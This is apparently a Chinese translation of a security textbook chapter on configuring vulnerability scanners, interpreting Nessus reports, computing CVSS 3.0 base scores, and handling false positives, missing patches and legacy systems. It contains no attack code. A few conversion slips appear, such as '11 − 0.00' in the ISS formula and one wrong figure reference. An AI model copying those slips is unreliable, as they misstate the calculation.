  \n#### 配置漏洞扫描\n\n漏洞管理解决方案为管理员提供了配置与扫描相关的许多不同参数的能力。除了安排自动扫描和生成报告外，管理员还可以自定义扫描器执行的检查类型、提供访问目标服务器的凭据、在目标服务器上安装扫描代理，并从各种网络视角进行扫描。定期对漏洞扫描器进行`配置审查`非常重要，以确保扫描设置符合当前需求。\n\
  \n##### 扫描灵敏度级别\n\n配置漏洞扫描的网络安全专业人员应仔细关注与扫描灵敏度级别相关的配置设置。这些设置决定了扫描器将执行的检查类型，并应进行自定义，以确保扫描达到其目标，同时最大限度地降低干扰目标环境的可能性。\n\
  \n通常，管理员通过从模板开始来创建新的扫描。这可能是由漏洞管理供应商提供并内置于产品中的模板，例如 图 5.4 所示的 Nessus 模板，也可能是为组织内部使用而创建的自定义模板。当管理员创建自己的扫描配置时，应考虑将通用配置设置保存到模板中，以便高效地重复利用工作成果，在配置未来的扫描时节省时间并减少错误。\n\
  \n![FIGURE 5.4 Nessus scan templates](img/c05f004.png)\n\n**图 5.4** Nessus 扫描模板\n\
  \n管理员还可以通过配置每次扫描期间将运行的特定插件来提高扫描效率。每个插件针对特定漏洞执行检查，这些插件通常根据所涉及的操作系统、应用程序或设备分组为系列。禁用不必要的插件通过跳过不必要的检查来提高扫描速度，并且还可能减少扫描器检测到的误报结果数量。\n\
  \n例如，不使用 Amazon Linux 操作系统的组织可以选择在其扫描模板中禁用所有与 Amazon Linux 相关的检查。图 5.5 展示了在 Nessus\
  \ 中禁用这些插件的示例。\n\n![FIGURE 5.5 Disabling unused plug-ins](img/c05f005.png)\n\n**图\
  \ 5.5** 禁用未使用的插件\n\n##### 补充网络扫描\n\n基本漏洞扫描通过网络运行，从远处探测系统。这通过模拟攻击者从另一个网络视角可能看到的内容，提供了系统安全性的现实视图。然而，扫描器与目标服务器之间路径上存在的防火墙、入侵防御系统和其他安全控制可能会影响扫描结果，从而提供一个独立于这些控制之外的、不准确的服务器安全视图。\n\
  \n此外，许多安全漏洞仅靠远程扫描难以确认。通过网络运行的漏洞扫描可能检测到漏洞存在的可能性，但无法有信心地确认它，从而导致误报结果，这需要管理员耗费大量时间进行调查。\n\
  \n现代漏洞管理解决方案可以利用关于服务器配置的可信信息来补充这些远程扫描。收集此信息主要有两种方式。首先，管理员可以向扫描器提供凭据，允许扫描器连接到目标服务器并检索配置信息。然后可以使用这些信息来确定漏洞是否存在，与非凭据扫描相比，提高了扫描的准确性。例如，如果漏洞扫描检测到一个可通过操作系统更新修复的潜在问题，凭据扫描可以在报告漏洞之前检查该更新是否已安装在系统上。\n\
  \n图 5.6 展示了 Qualys 中可用的`凭据扫描`选项示例。凭据扫描可访问操作系统、数据库和应用程序等来源。\n\n![FIGURE 5.6 Configuring\
  \ credentialed scanning](img/c05f006.png)\n\n**图 5.6** 配置凭据扫描\n\n\n\n除了凭证扫描外，一些扫描器还通过*基于代理的扫描*方法来补充传统的*基于服务器的扫描*漏洞扫描方法。在这种方法中，管理员在每台目标服务器上安装小型软件代理。这些代理对服务器配置进行扫描，提供“由内而外”的漏洞扫描，然后将信息报告回漏洞管理平台进行分析和报告。\n\
  \n###### 扫描视角\n\n全面的漏洞管理计划提供从多种*扫描视角*进行扫描的能力。每个扫描视角从网络上的不同位置进行扫描，提供不同的漏洞视图。例如，外部扫描从互联网运行，让管理员了解组织外部的攻击者会将什么视为潜在漏洞。内部扫描可能从通用企业网络上的扫描器运行，提供恶意内部人员可能遇到的视图。最后，位于数据中心内的扫描器和位于服务器上的代理通过显示可能被网络上其他安全控制阻止的漏洞，提供服务器真实状态的最准确视图。可能影响扫描结果的控制包括：\n\
  \n*   防火墙设置\n*   网络分段\n*   入侵检测系统（`IDSs`）\n*   入侵防御系统（`IPSs`）\n\n漏洞管理平台能够管理不同的扫描器，并提供扫描结果的综合视图，汇编来自不同来源的数据。图\
  \ 5.7 显示了管理员如何使用 Qualys 为新配置的扫描选择扫描设备的示例。\n\n![FIGURE 5.7 Choosing a scan appliance](img/c05f007.png)\n\
  \n**图 5.7** 选择扫描设备\n\n##### 扫描器维护\n\n与任何技术产品一样，漏洞管理解决方案需要维护和保养。管理员应定期维护其漏洞扫描器，以确保扫描软件和*漏洞源*保持最新。\n\
  \n###### 扫描器软件\n\n扫描系统本身也不能免疫漏洞。如图 5.8 所示，甚至漏洞扫描器也可能存在安全问题！定期修补扫描器软件可保护组织免受特定于扫描器的漏洞影响，并提供重要的错误修复和功能增强以提高扫描质量。\n\
  \n![FIGURE 5.8 Nessus vulnerability in the NIST National Vulnerability Database\
  \ ¶ Source: NIST](img/c05f008.png)\n\n**图 5.8** NIST 国家漏洞数据库中的 Nessus 漏洞 ¶ 来源：NIST\n\
  \n###### 漏洞插件源\n\n安全研究人员每周都会发现新漏洞，只有当漏洞扫描器频繁接收插件更新时，它们才能对这些漏洞有效。管理员应将其扫描器配置为定期检索新插件，最好是每天。幸运的是，如图\
  \ 5.9 所示，此过程很容易实现自动化。\n\n![FIGURE 5.9 Nessus Automatic Updates](img/c05f009.png)\n\
  \n**图 5.9** Nessus 自动更新\n\n##### 漏洞扫描工具\n\n当你构建网络安全工具包时，你会希望拥有网络漏洞扫描器、应用程序扫描器和 Web\
  \ 应用程序扫描器以供使用。漏洞扫描器常用于预防性扫描和测试，也存在于渗透测试人员的工具包中，帮助他们识别可利用的系统。这一事实也意味着它们是攻击者的最爱工具！\n\
  \n###### 基础设施漏洞扫描\n\n网络漏洞扫描器能够探测各种网络连接设备的已知漏洞。它们连接到网络上连接的任何系统，尝试确定设备类型及其配置，然后启动有针对性的测试，旨在检测这些设备上是否存在任何已知漏洞。\n\
  \n以下工具是网络漏洞扫描器的示例：\n\n*   Tenable 的 `Nessus` 是一款知名且广受尊敬的网络漏洞扫描产品，是该领域最早的产品之一。\n\
  *   `Qualys` 的漏洞扫描器是一款较新开发的商业网络漏洞扫描器，提供了一种独特的部署模型，使用软件即服务（`SaaS`）管理控制台，利用位于本地数据中心和云中的设备运行扫描。\n\
  *   Rapid7 的 `Nexpose` 是另一款商业漏洞管理系统，提供与 `Nessus` 和 `Qualys` 类似的功能。\n*   开源的 `OpenVAS`\
  \ 为商业漏洞扫描器提供了免费替代方案。\n\n这四款是最常用的网络漏洞扫描器。市场上还有许多其他产品，每个成熟的组织工具包中都应至少有一款扫描器。许多组织选择在同一环境中部署两种不同的漏洞扫描产品作为纵深防御控制。\n\
  \n###### 应用程序扫描\n\n应用程序扫描工具通常用作软件开发过程的一部分。这些工具分析定制开发的软件以识别常见的安全漏洞。应用程序测试使用三种技术进行：\n\
  \n*   *静态测试* 在不执行代码的情况下分析代码。这种方法直接指向开发人员的漏洞，并通常提供具体的修复建议。\n*   *动态测试* 作为测试的一部分执行代码，使用各种输入运行代码向用户公开的所有接口，搜索漏洞。\n\
  *   *交互式测试* 结合了静态和动态测试，在测试人员通过公开接口与应用程序交互时分析源代码。\n\n应用程序测试应成为软件开发过程的组成部分。许多组织将测试要求引入软件发布流程，要求代码在发布到生产环境前通过测试。\n\
  \n###### Web 应用程序扫描\n\nWeb 应用程序扫描器是用于检查 Web 应用程序安全性的专用工具。这些工具测试特定于 Web 的漏洞，例如 SQL\
  \ 注入、跨站脚本（`XSS`）和跨站请求伪造（`CSRF`）漏洞。它们通过将 Web 服务器的传统网络扫描与使用诸如发送已知恶意输入序列和模糊测试等技术对 Web\
  \ 应用程序的详细探测相结合来工作，试图破坏应用程序。\n\n`Nikto` 是一款流行的 Web 应用程序扫描工具。它是一款开源工具，任何人都可以免费使用。如图\
  \ 5.10 所示，它使用命令行界面，使用起来有些困难。\n\n另一款可用于 Web 应用程序扫描的开源工具是 `Arachni`。该工具如图 5.11 所示，是一款适用于\
  \ Windows、macOS 和 Linux 操作系统的打包扫描器。\n\n大多数组织确实使用 Web 应用程序扫描器，但它们选择使用提供高级功能和用户友好界面的商业产品。虽然市场上有专用的\
  \ Web 应用程序扫描器（如 `Acunetix`），但许多公司使用传统网络漏洞扫描器（如 `Nessus`、`Qualys` 和 `Nexpose`）的 Web\
  \ 应用程序扫描功能。\n\n##### 审查和解读扫描报告\n\n\n\n\n### 漏洞扫描报告\n\n漏洞扫描报告为分析师提供了大量信息，有助于解读报告。这些报告提供了关于其识别出的每个漏洞的详细信息。图\
  \ 5.12 展示了 Nessus 漏洞扫描器报告的单个漏洞示例。\n\n![FIGURE 5.10 Nikto web application scanner](img/c05f010.png)\n\
  \n**图 5.10** Nikto Web 应用程序扫描器\n\n![FIGURE 5.11 Arachni web application scanner](img/c05f011.png)\n\
  \n**图 5.11** Arachni Web 应用程序扫描器\n\n![FIGURE 5.12 Nessus vulnerability scan report](img/c05f012.png)\n\
  \n**图 5.12** Nessus 漏洞扫描报告\n\n让我们逐节查看此报告，从左上角开始，按逆时针方向进行。\n\n在报告的最顶端，我们看到两个关键细节：*漏洞名称*，它提供了一个描述性标题；以及漏洞的*总体严重性*，以通用类别表示，如低、中、高或严重。在本示例报告中，扫描器报告称一台服务器正在运行过时且不安全的\
  \ SSL 协议版本。它被归类为高严重性类别。\n\n接下来，报告提供了漏洞的*详细描述*。在本例中，报告详细描述了 SSL 协议中的缺陷，并解释了 SSL 不再被认为可接受使用。\n\
  \n报告的下一节提供了漏洞的*解决方案*。在可能的情况下，扫描器会提供关于系统管理员、安全专业人员、网络工程师和/或应用程序开发人员如何修复漏洞的详细信息。在本例中，指示读者禁用\
  \ SSL 2.0 和 3.0，并用安全版本的 TLS 协议替代其使用。\n\n在标题为“另请参阅”的报告部分中，扫描器提供了*参考资料*，管理员可在其中找到报告中描述的漏洞的更多详细信息。在本例中，扫描器将读者引向多篇博客文章、Nessus\
  \ 文档页面以及互联网工程任务组（IETF）文档，这些资料提供了关于该漏洞的更多详细信息。\n\n报告的*输出*部分显示了在探测漏洞时远程系统返回的详细信息。此信息对分析师极具价值，因为它通常提供命令返回的逐字输出。分析师可利用此信息更好地理解扫描器报告漏洞的原因、确定漏洞位置，并有可能识别误报。在本例中，输出部分显示了正在使用的特定不安全加密套件。\n\
  \n*端口/主机*部分提供了包含漏洞的服务器以及该服务器上存在漏洞的特定服务的详细信息。在本例中，出于隐私原因服务器的 IP 地址被遮盖，但我们可以看到该服务器在\
  \ 443 和 4433 端口上均运行着不安全版本的 SSL。\n\n*漏洞信息*部分提供了关于漏洞的一些杂项信息。在本例中，我们看到该 SSL 漏洞曾出现在新闻报道中。\n\
  \n*风险信息*部分包含用于评估漏洞严重性的有用信息。在本例中，扫描器报告该漏洞的总体风险因子为高（与漏洞标题旁的标签一致）。它还提供了使用通用漏洞评分系统（CVSS）评级时的详细情况。你会注意到有两个不同的\
  \ CVSS 评分和向量。我们将使用 CVSS 3.0 版本的信息，因为它是更新的评级标准。在本例中，该漏洞的 CVSS 基础评分为 7.5，CVSS 向量为：\n\
  \n```\nCVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n```\n\n我们将在本章的下一节讨论 CVSS 评分的详细细节。\n\
  \n漏洞报告的最后一部分提供了检测到该问题的漏洞扫描器插件的详细信息。该漏洞由 Nessus 插件 ID 20007 报告，该插件于 2005 年 10 月发布，并于\
  \ 2019 年 3 月更新。\n\n#### 理解 CVSS\n\n*通用漏洞评分系统（CVSS）* 是评估安全漏洞严重性的行业标准。它提供了一种根据多种度量对每个漏洞进行评分的技术。网络安全分析师通常使用\
  \ CVSS 评级来确定响应行动的优先级。\n\n分析师在对新漏洞评分时，首先根据八个不同的度量对漏洞进行评级。每个度量都会获得一个描述性评级和一个数值评分。前四个度量评估漏洞的可利用性，而后三个度量评估漏洞的影响。第八个度量讨论漏洞的范围。\n\
  \n##### 攻击向量度量\n\n*攻击向量度量* 描述攻击者如何利用该漏洞，并根据 表 5.1 所示标准进行赋值。\n\n**表 5.1** CVSS 攻击向量度量\n\
  \n| 值 | 描述 | 评分 |\n| --- | --- | --- |\n| 物理 (P) | 攻击者必须物理接触易受攻击的设备。 | 0.20 |\n\
  | 本地 (L) | 攻击者必须拥有对受影响系统的物理或逻辑访问权限。 | 0.55 |\n| 相邻网络 (A) | 攻击者必须拥有受影响系统所连接的本地网络的访问权限。\
  \ | 0.62 |\n| 网络 (N) | 攻击者可通过网络远程利用该漏洞。 | 0.85 |\n\n##### 攻击复杂性度量\n\n*攻击复杂性度量* 描述利用该漏洞的难度，并根据\
  \ 表 5.2 所示标准进行赋值。\n\n**表 5.2** CVSS 攻击复杂性度量\n\n| 值 | 描述 | 评分 |\n| --- | --- | ---\
  \ |\n| 高 (H) | 利用该漏洞需要难以满足的“特殊”条件。 | 0.44 |\n| 低 (L) | 利用该漏洞不需要任何特殊条件。 | 0.77 |\n\
  \n##### 所需权限度量\n\n*所需权限度量* 描述攻击者利用漏洞所需的账户访问类型，并根据 表 5.3 中的标准进行赋值。\n\n**表 5.3** CVSS\
  \ 所需权限度量\n\n| 值 | 描述 | 评分 |\n| --- | --- | --- |\n| 高 (H) | 攻击者需要管理员权限才能发起攻击。 |\
  \ 0.270（若范围已改变则为 0.50） |\n| 低 (L) | 攻击者需要基本用户权限才能发起攻击。 | 0.62（若范围已改变则为 0.68） |\n\
  | 无 (N) | 攻击者无需认证即可利用该漏洞。 | 0.85 |\n\n##### 用户交互度量\n\n*用户交互度量* 描述攻击者是否需要让另一个人参与攻击。用户交互度量根据\
  \ 表 5.4 中的标准进行赋值。\n\n**表 5.4** CVSS 用户交互度量\n\n| 值 | 描述 | 评分 |\n| --- | --- | ---\
  \ |\n| 无 (N) | 成功利用不需要攻击者以外的任何用户采取行动。 | 0.85 |\n| 需要 (R) | 成功利用需要攻击者以外的用户采取行动。 |\
  \ 0.62 |\n\n##### 机密性度量\n\n\n\n\n`机密性指标` 描述了如果攻击者成功利用该漏洞可能发生的信息泄露类型。机密性指标根据 表 5.5\
  \ 中的标准进行分配。\n\n**表 5.5**  CVSS 机密性指标\n\n| 值 | 描述 | 分数 |\n| --- | --- | --- |\n|\
  \ 无 (N) | 没有机密性影响。 | 0.00 |\n| 低 (L) | 可能访问某些信息，但攻击者无法控制泄露哪些信息。 | 0.22 |\n| 高 (H)\
  \ | 系统上的所有信息均被泄露。 | 0.56 |\n\n##### 完整性指标\n\n`完整性指标` 描述了如果攻击者成功利用该漏洞可能发生的信息篡改类型。完整性指标根据\
  \ 表 5.6 中的标准进行分配。\n\n**表 5.6**  CVSS 完整性指标\n\n| 值 | 描述 | 分数 |\n| --- | --- | ---\
  \ |\n| 无 (N) | 没有完整性影响。 | 0.00 |\n| 低 (L) | 可能修改某些信息，但攻击者无法控制修改哪些信息。 | 0.22 |\n\
  | 高 (H) | 系统的完整性完全被破坏，攻击者可随意更改任何信息。 | 0.56 |\n\n##### 可用性指标\n\n`可用性指标` 描述了如果攻击者成功利用该漏洞可能发生的中断类型。可用性指标根据\
  \ 表 5.7 中的标准进行分配。\n\n**表 5.7**  CVSS 可用性指标\n\n| 值 | 描述 | 分数 |\n| --- | --- | ---\
  \ |\n| 无 (N) | 没有可用性影响。 | 0.00 |\n| 低 (L) | 系统性能下降。 | 0.22 |\n| 高 (H) | 系统完全关闭。\
  \ | 0.56 |\n\n##### 范围指标\n\n`范围指标` 描述了该漏洞是否会影响漏洞范围之外的系统组件。范围指标根据 表 5.8 中的标准进行分配。请注意，范围指标表不包含分数信息。范围指标的值反映在较早前\
  \ 表 5.3 所示的所需权限指标的值中。\n\n**表 5.8**  CVSS 范围指标\n\n| 值 | 描述 |\n| --- | --- |\n| 未改变\
  \ (U) | 被利用的漏洞只能影响由同一安全机构管理的资源。 |\n| 已改变 (C) | 被利用的漏洞可影响管理包含该漏洞组件的安全机构范围之外的资源。 |\n\
  \n##### 解读 CVSS 向量\n\n`CVSS 向量` 使用单行格式来传达漏洞在前几节所述所有六个指标上的评级。例如，回顾 图 5.12 中呈现的漏洞的\
  \ CVSS 向量：\n\n```\nCVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n```\n\n该向量包含九个组件。第一部分“CVSS:3.0”仅告知读者（人或系统）该向量是使用\
  \ CVSS 3.0 版本编写的。接下来的八个部分对应八个 CVSS 指标中的每一个。在本例中，图 5.1 中的 SSL 漏洞获得了以下评级：\n\n*   攻击向量：网络（分数：0.85）\n\
  *   攻击复杂性：低（分数：0.77）\n*   所需权限：无（分数：0.85）\n*   用户交互：无（分数：0.85）\n*   范围：未改变\n*  \
  \ 机密性：高（分数：0.56）\n*   完整性：无（分数：0.00）\n*   可用性：无（分数：0.00）\n\n##### CVSS 分数汇总\n\n\
  `CVSS 向量` 提供了关于漏洞所构成风险性质的详细信息，但向量的复杂性使其难以用于优先级排序练习。因此，分析师可以计算 `CVSS 基础分`，这是一个代表漏洞总体风险的单一数字。得出基础分需要首先计算其他一些\
  \ CVSS 组件分数。\n\n###### 计算影响子分数 (ISS)\n\n分析师执行的第一项计算是计算影响子分数 (ISS)。该指标使用以下公式汇总三个影响指标：\n\
  \n![equation](img/c05-disp-0001.png)<math display=\"block\"><mi mathvariant=\"normal\"\
  >I</mi><mi mathvariant=\"normal\">S</mi><mi mathvariant=\"normal\">S</mi><mo>=</mo><mn>1</mn><mo>&#8722;</mo><mfenced\
  \ open=\"\\[\" close=\"\\]\"><mrow><mfenced open=\"(\" close=\")\"><mrow><mn>1</mn><mo>&#8722;</mo><mi\
  \ mathvariant=\"normal\">Confidentiality</mi></mrow></mfenced><mspace width=\"0.5em\"\
  /><mo>&#215;</mo><mspace width=\"0.5em\"/><mfenced open=\"(\" close=\")\"><mrow><mn>1</mn><mo>&#8722;</mo><mi\
  \ mathvariant=\"normal\">Integrity</mi></mrow></mfenced><mspace width=\"0.5em\"\
  /><mo>&#215;</mo><mspace width=\"0.5em\"/><mfenced open=\"(\" close=\")\"><mrow><mn>1</mn><mo>&#8722;</mo><mi\
  \ mathvariant=\"normal\">Availability</mi></mrow></mfenced></mrow></mfenced></math>\n\
  \n代入我们的 SSL 漏洞的值，得到\n\n![equation](img/c05-disp-0002.png)<math display=\"block\"\
  ><mi mathvariant=\"normal\">I</mi><mi mathvariant=\"normal\">S</mi><mi mathvariant=\"\
  normal\">S</mi><mo>=</mo><mn>1</mn><mo>&#8722;</mo><mfenced open=\"\\[\" close=\"\
  \\]\"><mrow><mfenced open=\"(\" close=\")\"><mrow><mn>1</mn><mo>&#8722;</mo><mn>0.56</mn></mrow></mfenced><mo>&#215;</mo><mfenced\
  \ open=\"(\" close=\")\"><mrow><mn>11</mn><mo>&#8722;</mo><mn>0.00</mn></mrow></mfenced><mo>&#215;</mo><mfenced\
  \ open=\"(\" close=\")\"><mrow><mn>11</mn><mo>&#8722;</mo><mn>0.00</mn></mrow></mfenced></mrow></mfenced></math>\
  \ ![equation](img/c05-disp-0003.png)<math display=\"block\"><mi mathvariant=\"normal\"\
  >I</mi><mi mathvariant=\"normal\">S</mi><mi mathvariant=\"normal\">S</mi><mo>=</mo><mn>1</mn><mo>&#8722;</mo><mfenced\
  \ open=\"\\[\" close=\"\\]\"><mrow><mn>0.44</mn><mo>&#215;</mo><mn>1.00</mn><mo>&#215;</mo><mn>1.00</mn></mrow></mfenced></math>\
  \ ![equation](img/c05-disp-0004.png)<math display=\"block\"><mi mathvariant=\"normal\"\
  >I</mi><mi mathvariant=\"normal\">S</mi><mi mathvariant=\"normal\">S</mi><mo>=</mo><mn>1</mn><mo>&#8722;</mo><mn>0.44</mn></math>\
  \ ![equation](img/c05-disp-0005.png)<math display=\"block\"><mi mathvariant=\"normal\"\
  >I</mi><mi mathvariant=\"normal\">S</mi><mi mathvariant=\"normal\">S</mi><mo>=</mo><mn>0.56</mn></math>\n\
  \n###### 计算影响分数\n\n要从影响子分数获得影响分数，必须考虑范围指标的值。如果范围指标为未改变（如本例所示），我们将 ISS 乘以 6.42：\n\
  \n![equation](img/c05-disp-0006.png)<math display=\"block\"><mi mathvariant=\"normal\"\
  >Impact</mi><mo>=</mo><mn>6.42</mn><mo>&#215;</mo><mi mathvariant=\"normal\">I</mi><mi\
  \ mathvariant=\"normal\">S</mi><mi mathvariant=\"normal\">S</mi></math> ![equation](img/c05-disp-0007.png)<math\
  \ display=\"block\"><mi mathvariant=\"normal\">Impact</mi><mo>=</mo><mn>6.42</mn><mo>&#215;</mo><mn>0.56</mn></math>\
  \ ![equation](img/c05-disp-0008.png)<math display=\"block\"><mi mathvariant=\"normal\"\
  >Impact</mi><mo>=</mo><mn>3.60</mn></math>\n\n如果范围指标为已改变，我们使用一个更复杂的公式：\n\n![equation](img/c05-disp-0009.png)<math\
  \ display=\"block\"><mi mathvariant=\"normal\">Impact</mi><mo>=</mo><mn>7.52</mn><mo>&#215;</mo><mfenced\
  \ open=\"(\" close=\")\"><mrow><mi mathvariant=\"normal\">I</mi><mi mathvariant=\"\
  normal\">S</mi><mi mathvariant=\"normal\">S</mi><mo>&#8722;</mo><mn>0.029</mn></mrow></mfenced><mo>&#8722;</mo><mn>3.25</mn><mo>&#215;</mo><msup><mfenced\
  \ open=\"(\" close=\")\"><mrow><mi mathvariant=\"normal\">I</mi><mi mathvariant=\"\
  normal\">S</mi><mi mathvariant=\"normal\">S</mi><mo>&#8722;</mo><mn>0.02</mn></mrow></mfenced><mn>15</mn></msup></math>\n\
  \n###### 计算可利用性分数\n\n\n\n分析师可以使用以下公式计算漏洞的可利用性评分：\n\n![equation](img/c05-disp-0010.png)\n\
  <math display=\"block\"><mtable columnalign=\"left\"><mtr><mtd><mi mathvariant=\"\
  normal\">Exploitability</mi><mo>=</mo><mn>8.22</mn><mo>&#215;</mo><mi mathvariant=\"\
  normal\">AttackVector</mi><mo>&#215;</mo><mi mathvariant=\"normal\">AttackComplexity</mi><mo>&#215;</mo><mi\
  \ mathvariant=\"normal\">PrivilegesRequired</mi><mspace width=\"0.24em\"/></mtd></mtr><mtr><mtd><mo>&#215;</mo><mi\
  \ mathvariant=\"normal\">UserInteraction</mi></mtd></mtr></mtable></math>\n\n代入我们的\
  \ SSL 漏洞的值，我们得到：\n\n![equation](img/c05-disp-0011.png)\n<math display=\"block\"\
  ><mi mathvariant=\"normal\">Exploitability</mi><mo>=</mo><mn>8.22</mn><mo>&#215;</mo><mn>0.85</mn><mo>&#215;</mo><mn>0.77</mn><mo>&#215;</mo><mn>0.85</mn><mo>&#215;</mo><mn>0.85</mn></math>\n\
  ![equation](img/c05-disp-0012.png)\n<math display=\"block\"><mi mathvariant=\"normal\"\
  >Exploitability</mi><mo>=</mo><mn>3.89</mn></math>\n\n##### 计算基础评分\n\n掌握所有这些信息后，我们现在可以使用以下规则确定\
  \ CVSS 基础评分：\n\n*   如果影响评分为 0，则基础评分为 0。\n*   如果范围指标为 **Unchanged**，则通过将影响评分和可利用性评分相加来计算基础评分。\n\
  *   如果范围指标为 **Changed**，则通过将影响评分和可利用性评分相加，并将结果乘以 1.08 来计算基础评分。\n*   最高可能的基础评分为 10。如果计算值大于\
  \ 10，则将基础评分设置为 10。\n\n在我们的示例中，影响评分为 3.60，可利用性评分四舍五入为 3.9。将它们相加，我们得到基础评分 7.5，这与 Figure\
  \ 5.12 中找到的值相同。\n\n##### CVSS 基础评分分类\n\n许多漏洞扫描系统通过使用风险类别而非数字风险评级来进一步总结 CVSS 结果。这些通常基于\
  \ CVSS 定性严重程度评级标准，如 Table 5.9 所示。\n\n**TABLE 5.9** CVSS 定性严重程度评级标准\n\n| CVSS 评分\
  \ | 评级 |\n| --- | --- |\n| 0.0 | None |\n| 0.1-3.9 | Low |\n| 4.0-6.9 | Medium |\n\
  | 7.0-8.9 | High |\n| 9.0-10.0 | Critical |\n\n继续以 Figure 5.12 中的 SSL 漏洞示例为例，我们计算出该漏洞的\
  \ CVSS 评分为 7.5。这将其归入 High 风险类别，如 Figure 5.12 标题所示。\n\n#### 验证扫描结果\n\n解读报告的网络安全分析师通常会进行自己的调查，以确认漏洞的存在和严重程度。这些调查可能包括使用提供额外信息的外部数据源，这些信息对分析很有价值。\n\
  \n##### 误报\n\n漏洞扫描器是有用的工具，但它们并非万无一失。扫描器有时会由于各种原因出错。扫描器可能没有足够的访问权限来确认目标系统上的漏洞，或者它可能只是插件中存在错误，从而生成错误的漏洞报告。当扫描器报告一个不存在的漏洞时，这被称为\
  \ **false positive error**（误报错误）。\n\n当漏洞扫描器报告一个漏洞时，这被称为 **positive report**（阳性报告）。该报告可能是准确的（**true\
  \ positive** 报告）或不准确的（**false positive** 报告）。同样，当扫描器报告不存在漏洞时，这是一个 **negative report**（阴性报告）。阴性报告可能是准确的（**true\
  \ negative** 报告）或不准确的（**false negative** 报告）。\n\n网络安全分析师应确认扫描器报告的每个漏洞。在某些情况下，这可能只是验证补丁缺失或操作系统过时那么简单。在其他情况下，验证漏洞需要复杂的手动过程来模拟攻击。例如，验证\
  \ SQL 注入漏洞可能需要实际尝试针对 Web 应用程序的攻击，并在后端数据库中验证结果。\n\n验证漏洞时，分析师应利用自己的专业知识以及组织内其他人的主题专业知识。数据库管理员、系统工程师、网络技术员、软件开发人员和其他专家拥有对评估潜在误报报告至关重要的领域知识。\n\
  \n##### 将扫描结果与其他数据源协调\n\n漏洞扫描绝不应在真空环境中进行。解读这些报告的网络安全分析师在执行分析时还应求助于其他安全信息来源。此过程的宝贵信息来源包括：\n\
  \n*   来自服务器、应用程序、网络设备和其他来源的 **Log reviews**（日志审查），这些来源可能包含关于试图利用检测到的漏洞的信息\n*   **Security\
  \ information and event management (SIEM)**（安全信息和事件管理）系统，它们关联来自多个来源的日志条目并提供可操作的情报\n\
  *   **Configuration management systems**（配置管理系统），它们提供有关系统上安装的操作系统和应用程序的信息\n\n当分析师尝试将扫描报告与组织计算环境的现实相协调时，这些信息来源中的每一个都可能证明是无价的。\n\
  \n### 安全漏洞\n\n每个漏洞扫描系统都包含能够检测数千种可能漏洞的插件，范围从 Web 应用程序中的主要 SQL 注入缺陷到网络设备中更平常的信息泄露问题。虽然不可能在任何长度的书中讨论每一个漏洞，但网络安全分析师应该熟悉最常见的检测到的漏洞以及涵盖许多不同漏洞变体的一些通用类别。\n\
  \n#### 补丁管理\n\n向系统应用安全补丁应该是任何信息安全计划的核心实践之一，但由于缺乏预防性维护资源，这项例行任务经常被忽视。漏洞扫描中最常见的警报之一是网络上的一个或多个系统正在运行过时版本的操作系统或应用程序，并需要安全补丁。\n\
  \nFigure 5.13 显示了这些扫描结果的一个示例。位于 `10.64.142.211` 的服务器存在远程代码执行漏洞。虽然扫描结果相当简短，但它确实包含相当多的有用信息。\n\
  \n幸运的是，有一个简单的方法可以解决这个问题。Solution 部分告诉我们，Microsoft 为受影响的操作系统发布了补丁，See Also 部分提供了指向\
  \ Microsoft 安全公告（`MS15-034`）的直接链接，该公告更详细地描述了问题和解决方案。\n\nFigure 5.13 中显示的漏洞突显了运行\
  \ **patch management**（补丁管理）计划的重要性，该计划例行修补安全问题。Figure 5.13 中显示的问题暴露了操作系统层面不当或薄弱的补丁管理，但这些弱点也可能存在于应用程序和固件中。\n\
  \n![FIGURE 5.13 Missing patch vulnerability](img/c05f013.png)\n\n**FIGURE 5.13**\
  \ Missing patch vulnerability\n\n#### 遗留平台\n\n\n\n\n##### 软件生命周期结束\n\n软件供应商最终会停止对其生产的每一款产品提供支持。操作系统和应用程序均不例外。一旦供应商宣布某产品最终停止支持，继续运行该过时软件的组织将面临重大的攻击风险。供应商将不再调查或修复该日期后出现的产品安全缺陷。从安全角度来看，继续运行不受支持产品的组织将独自面对风险，除非你碰巧维护着一支操作系统开发团队，否则这绝不是一个好局面。\n\
  \n也许最著名的主要操作系统停止支持事件发生在 2015 年 7 月，当时微软停止了对使用了十多年的 Windows Server 2003 的支持。图 5.14\
  \ 展示了 Nessus 在识别出运行此过时操作系统的服务器时生成的报告示例。\n\n从该报告中我们可以看到，扫描检测到网络上有两台服务器运行着 Windows\
  \ Server 2003。漏洞描述对继续运行任何不受支持操作系统的组织将面临的局势给出了严峻的评估：\n\n> 缺乏支持意味着供应商将不再为该产品发布新的安全补丁。因此，它很可能包含安全漏洞。此外，微软不太可能调查或确认漏洞报告。\n\
  \n![图 5.14 不受支持的操作系统漏洞](img/c05f014.png)\n\n**图 5.14** 不受支持的操作系统漏洞\n\n对于运行不受支持操作系统的组织而言，解决方案在措辞上很简单，但在实施上却很复杂。“升级到当前仍受支持的\
  \ Windows 版本”是一条相当直接的指令，但对于运行着根本无法升级到新版 Windows 的应用程序的组织来说，这可能构成重大挑战。在组织必须继续使用不受支持的操作系统的情况下，最佳实践要求尽可能隔离该系统，最好不要将其连接到任何网络，并应用尽可能多的补偿性安全控制，例如加强监控和实施严格的网络防火墙规则。\n\
  \n#### 弱配置\n\n漏洞扫描还可能突出显示系统、应用程序和设备上的弱配置设置。这些弱配置可能包括以下内容：\n\n*   使用构成安全风险的默认设置，例如在将系统移至生产环境前本应禁用的管理设置页面。\n\
  *   存在不安全的账户，包括普通用户账户和拥有管理权限的不安全根账户。当账户缺乏强身份验证或使用默认密码时，可被视为不安全账户。\n*   非支持正常系统运行所必需的开放端口和服务。这将根据服务器或设备的功能而异，但一般来说，系统应仅暴露执行其功能所需的最少量服务。\n\
  *   违反最小权限原则、允许用户过度访问的开放权限。\n\n这些只是可能危及安全的众多弱配置设置中的几个例子。你需要仔细阅读漏洞扫描结果，以识别你的环境中可能出现的其他问题。\n\
  \n#### 错误消息\n\n许多应用程序开发平台支持 `debug modes`（调试模式），为开发人员提供在开发过程中排查应用程序所需的关键错误信息。调试模式通常提供关于应用程序和服务器内部运作以及支持数据库的详细信息。虽然这些信息对开发人员有用，但可能会无意中协助攻击者获取有关数据库结构、应用程序使用的认证机制或其他细节的信息。因此，漏洞扫描会对扫描服务器上存在的调试模式发出警报。图\
